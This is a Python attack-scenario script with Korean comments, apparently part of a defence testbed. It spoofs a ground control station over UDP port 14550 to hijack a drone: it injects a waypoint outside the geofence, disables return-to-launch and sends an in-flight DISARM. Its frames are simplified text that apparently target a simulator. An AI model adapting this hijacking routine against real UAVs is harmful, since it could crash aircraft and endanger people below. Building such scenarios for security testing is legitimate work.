"""
S2 - MAVLink 명령 주입 : UAV 하이재킹
=====================================
목표(방산 맥락): 무인증 MAVLink 채널에 GCS 를 사칭한 명령을 주입해
UAV 를 탈취한다. 비행금지구역(지오펜스) 밖으로 웨이포인트를 변조하고,
자동복귀(RTL)를 무력화하며, 비행 중 시동 정지(DISARM)까지 시도.

기법:
  - UDP/14550 에 MAVLINK 프레임 직접 전송(출처 인증 부재 악용)
  - 지오펜스 위반 좌표 주입 → 항로 이탈
  - RTL_OVERRIDE, DISARM 으로 임무 무력화
"""
import sys
import json
import socket

def send(sock, host, port, frame, timeout=3):
    sock.sendto(frame.encode(), (host, port))
    try:
        sock.settimeout(timeout)
        data, _ = sock.recvfrom(2048)
        return data.decode(errors="replace")
    except socket.timeout:
        return None

def run(host="victim", port=14550):
    result = {"scenario": "S2_mavlink_inject", "target": f"{host}:{port}",
              "steps": []}
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # 0) 정찰: HEARTBEAT 로 응답 여부/상태 확인
    hb = send(s, host, port, "MAVLINK|1|HEARTBEAT|")
    result["steps"].append({"action": "recon_heartbeat", "resp": hb})
    reachable = hb is not None

    # 1) 항로 변조: 지오펜스 밖 좌표 주입
    evil_wp = "39.9,124.3"   # 안전범위(37.4-37.7 / 126.8-127.1) 이탈
    r1 = send(s, host, port, f"MAVLINK|2|NAV_WAYPOINT|{evil_wp}")
    result["steps"].append({"action": "inject_waypoint", "wp": evil_wp, "resp": r1})

    # 2) 자동복귀 무력화
    r2 = send(s, host, port, "MAVLINK|3|RTL|")
    result["steps"].append({"action": "disable_rtl", "resp": r2})

    # 3) 시동 정지 시도
    r3 = send(s, host, port, "MAVLINK|4|DISARM|")
    result["steps"].append({"action": "disarm", "resp": r3})
    s.close()

    hijacked = reachable and r1 and "ACK|NAV_WAYPOINT" in (r1 or "")
    result["success"] = bool(hijacked)
    result["impact"] = ("UAV 하이재킹: 항로 이탈 + RTL 무력화"
                        if hijacked else "명령 거부/차단")
    return result


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else "victim"
    print(json.dumps(run(h), ensure_ascii=False, indent=2))
